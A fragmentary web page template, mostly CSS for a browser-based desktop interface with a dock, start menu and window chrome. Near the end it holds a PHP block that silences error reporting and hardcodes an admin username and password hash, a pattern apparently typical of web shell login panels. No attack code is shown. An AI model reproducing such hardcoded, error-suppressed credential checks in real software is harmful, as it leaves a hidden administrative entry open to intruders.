...
body {
	font-size: 12px;
	background:#06C url(../img/menglong2.jpg) repeat scroll center center;
...
.powered_by {
	...
	height:25px;
	line-height:25px;
	background:url(../img/powered-by.png) no-repeat left center;
	color:#CCC;
	text-indent:26px;
	display:block;
	outline:none;
...
#leftBtn a, #rightBtn a {
	...
	height:40px;
	outline:none;
	background-image:url(../img/lr_btn.png);
...
#task_lb a {
	...
	width:100px;
	height:40px;
	background-image:url(../img/taskHdBtn.png);
	background-repeat:no-repeat;
	text-align:center;
	line-height:40px;
	float:right
...
#weather_btn {
	background:url(../img/wheather.png) no-repeat center center
}
#sound_btn {
	background:url(../img/sound_open.png) no-repeat center center
}
#showZm_btn {
	background:url(../img/show-desktop.png) no-repeat center center
}
#them_btn {
	background:url(../img/skin.png) no-repeat center center
}
/*侧边浮动栏*/
#lr_bar {
	width:73px;
	...
	left:0;
	top:30px;
	background:url(../img/dock_top.png) repeat-y left top;
	z-index:90;
...
#start_block {
	...
	left:0;
	bottom:-56px;
	background:url(../img/dock_b.png) no-repeat left bottom;
...
#start_btn {
	...
	width:48px;
	height:48px;
	background:url(../img/start-btn.png) no-repeat center bottom;
...
#start_item {
	...
	height:auto;
	padding:5px 0;
	background: url(../img/start_item_bg.png) repeat;
	position:absolute;
	z-index:500;
	left:75px;
	bottom:0px;
...
#start_item .item li:hover {
	background:url(../img/start_item_over.png) repeat-x left bottom;
	cursor:pointer
}
#start_item .item li span {
	...
	width:24px;
	height:24px;
	background-image:url(../img/start_itembtn.png);
	background-repeat:no-repeat;
	margin:0 10px;
	float:left;
}
#start_item .item li b {
	width:10px;
	height:24px;
	background:url(../img/item-child.png) no-repeat center center;
	display:inline-block;
	float:right;
	margin-right:10px;
}
...
#default_app .btnOver {
	background:url(../img/default_appbtn_bg.png) no-repeat center center
}
/*重写右键菜单样式*/
...
.win_title {
	...
	height:26px;
	line-height:26px;
	background:#E0E0E0 url(../img/titlebar_bg_cur.png) repeat-x left center;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;
}
...
.win_title .win_btnblock a {
	...
	width:26px;
	height:17px;
	background-image:url(../img/windowBtn.png);
	background-repeat:no-repeat;
	float:left;
	margin:0 1px;
	outline:none;
...
.desktop_icon .text {
	...
	text-align:center;
	color:#fff;
	background:url(../img/iconTextbg.png) no-repeat left center;
	position:relative;
	padding-left:10px;
	margin-right:10px;
}
.desktop_icon .right_cron {
	...
	right:-10px;
	top:0;
	background:url(../img/iconTextbg_right.png) left center no-repeat;
}
.desktop_icon_over {
	background:url(../img/icon_over.png) no-repeat center center;
}
-->
</style>
    ...
    <div id="start_item">
      <ul class="item admin">
		...
		<?php
			error_reporting(0);
			$user = ((string)admin1);
			$pass = ((string)zsf202cb962ac59075b964b07152d234b70);
...
<ul id="deskIcon">
  ...
  <li class="desktop_icon" id="win16" path="www.baidu.com"> <span class="icon"><img src="../img/icon10.png"/></span>
